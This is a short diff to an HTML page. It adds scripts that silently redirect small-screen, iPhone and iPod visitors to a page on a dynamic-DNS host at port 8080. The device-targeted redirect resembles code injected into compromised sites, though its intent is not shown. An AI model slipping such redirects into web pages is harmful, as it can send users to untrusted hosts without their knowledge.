@@ -214,5 +214,20 @@ $(document).ready(function(){
 })
 </script>
 
+<script type="text/javascript">
+
+    if (screen.width <= 699) {
+    document.location = "http://urbanstreet.ddns.net:8080/home.html";
+    }
+    </script>
+
+
+    <script type="text/javascript">
+    if ((navigator.userAgent.match(/iPhone/i)) || (navigator.userAgent.match(/iPod/i))) {
+       location.replace("http://urbanstreet.ddns.net:8080/home.html");
+    }
+
+</script>
+
 </body>
 </html>
